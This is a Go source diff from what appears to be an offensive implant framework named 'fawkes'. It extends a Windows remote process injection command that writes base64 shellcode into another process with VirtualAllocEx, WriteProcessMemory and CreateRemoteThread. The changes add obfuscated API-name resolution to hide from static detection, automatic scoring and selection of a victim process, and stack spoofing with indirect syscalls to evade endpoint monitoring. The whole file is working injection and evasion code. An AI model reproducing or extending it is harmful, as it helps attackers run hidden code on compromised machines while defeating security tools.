@@ -16,15 +16,16 @@ package commands
 
 import (
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"log"
 	"os"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 
+	"fawkes/pkg/obfuscate"
 	"fawkes/pkg/structs"
 )
 
@@ -41,14 +42,28 @@ const (
 	PAGE_READWRITE    = 0x04
 )
 
+// Injection API procs — critical procs (VirtualAllocEx, WriteProcessMemory, etc.)
+// use obfuscated names resolved via ensureInjectionAPIs(). kernel32 and CloseHandle
+// are pre-initialized so that dependent files (hwbp, ntdll_unhook, spawn, etc.) that
+// capture kernel32 at package init time always get a valid LazyDLL reference.
 var (
 	kernel32               = syscall.NewLazyDLL("kernel32.dll")
-	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
-	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
-	procOpenProcess        = kernel32.NewProc("OpenProcess")
+	procVirtualAllocEx     *syscall.LazyProc
+	procWriteProcessMemory *syscall.LazyProc
+	procCreateRemoteThread *syscall.LazyProc
+	procOpenProcess        *syscall.LazyProc
 	procCloseHandle        = kernel32.NewProc("CloseHandle")
+	initInjectionAPIs      sync.Once
 )
+
+func ensureInjectionAPIs() {
+	initInjectionAPIs.Do(func() {
+		procVirtualAllocEx = kernel32.NewProc(obfuscate.VirtualAllocEx())
+		procWriteProcessMemory = kernel32.NewProc(obfuscate.WriteProcessMemory())
+		procCreateRemoteThread = kernel32.NewProc(obfuscate.CreateRemoteThread())
+		procOpenProcess = kernel32.NewProc(obfuscate.OpenProcess())
+	})
+}
 
 // VanillaInjectionCommand implements the vanilla-injection command
 type VanillaInjectionCommand struct{}
@@ -63,36 +78,20 @@ func (c *VanillaInjectionCommand) Description() string {
 	return "Perform vanilla remote process injection using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread"
 }
 
-// VanillaInjectionParams represents the parameters for vanilla-injection
-type VanillaInjectionParams struct {
-	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode bytes
-	PID          int    `json:"pid"`           // Target process ID
-	Action       string `json:"action"`        // "inject" (default) or "migrate"
-}
-
-// isMigrateAction returns true if the action is a process migration.
-func isMigrateAction(action string) bool {
-	return strings.EqualFold(action, "migrate")
-}
-
 // Execute executes the vanilla-injection command
 func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResult {
+	ensureInjectionAPIs()
 	if runtime.GOOS != "windows" {
 		return errorResult("Error: This command is only supported on Windows")
 	}
 
-	var params VanillaInjectionParams
-	err := json.Unmarshal([]byte(task.Params), &params)
-	if err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	params, parseErr := unmarshalParams[VanillaInjectionParams](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if params.ShellcodeB64 == "" {
 		return errorResult("Error: No shellcode data provided")
-	}
-
-	if params.PID <= 0 {
-		return errorResult("Error: Invalid PID specified")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
@@ -105,9 +104,46 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 	}
 
 	output := fmt.Sprintf("[*] Received shellcode: %d bytes\n", len(shellcode))
+
+	// Auto-select target if target mode is specified
+	if params.Target != "" {
+		mode := TargetMode(strings.ToLower(params.Target))
+		targets, terr := SelectInjectionTarget(mode)
+		if terr != nil {
+			return errorf("Target selection failed: %v", terr)
+		}
+		output += fmt.Sprintf("[*] Target selection mode: %s\n", mode)
+		output += fmt.Sprintf("[*] Evaluated %d candidate processes:\n", len(targets))
+		for i, t := range targets {
+			marker := "  "
+			if i == 0 {
+				marker = ">>"
+			}
+			output += fmt.Sprintf("  %s PID %d %-25s score=%d [%s]\n",
+				marker, t.PID, t.Name, t.Score, strings.Join(t.Reasons, ", "))
+		}
+		bestPID, berr := BestTarget(targets)
+		if berr != nil {
+			return errorf("No suitable target: %v", berr)
+		}
+		params.PID = int(bestPID)
+		output += fmt.Sprintf("[+] Selected: PID %d (%s)\n", bestPID, targets[0].Name)
+	}
+
+	if params.PID <= 0 {
+		return errorResult("Error: Invalid PID specified (provide pid or target mode)")
+	}
+
 	output += fmt.Sprintf("[*] Target PID: %d\n", params.PID)
 
-	if IndirectSyscallsAvailable() {
+	if params.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
+	}
+
+	if params.StackSpoof && APISpoofAvailable() {
+		output += "[*] Using spoofed stack + indirect syscalls\n"
+	} else if IndirectSyscallsAvailable() {
 		output += "[*] Using indirect syscalls (calls originate from ntdll)\n"
 	} else {
 		output += "[*] Using standard Win32 API calls\n"
